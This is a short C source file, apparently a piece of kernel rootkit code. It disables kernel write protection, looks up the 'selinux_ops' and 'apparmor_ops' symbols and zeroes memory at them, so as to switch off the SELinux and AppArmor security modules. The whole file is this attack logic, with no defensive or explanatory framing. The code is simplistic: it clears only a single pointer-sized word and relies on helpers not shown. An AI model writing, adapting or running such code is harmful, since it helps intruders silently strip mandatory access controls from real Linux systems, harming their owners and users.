#include "shim.h"
#include "util.h"
#include "kernel.h"

void hook_kernel(void) {
    disable_write_protection();
    disable_lsm_hooks();
    enable_write_protection();
}

void disable_lsm_hooks(void) {
    uintptr_t *selinux_ops = (uintptr_t *)find_kernel_symbol("selinux_ops");
    uintptr_t *apparmor_ops = (uintptr_t *)find_kernel_symbol("apparmor_ops");
    if (selinux_ops) clear_memory(selinux_ops, sizeof(uintptr_t));
    if (apparmor_ops) clear_memory(apparmor_ops, sizeof(uintptr_t));
}
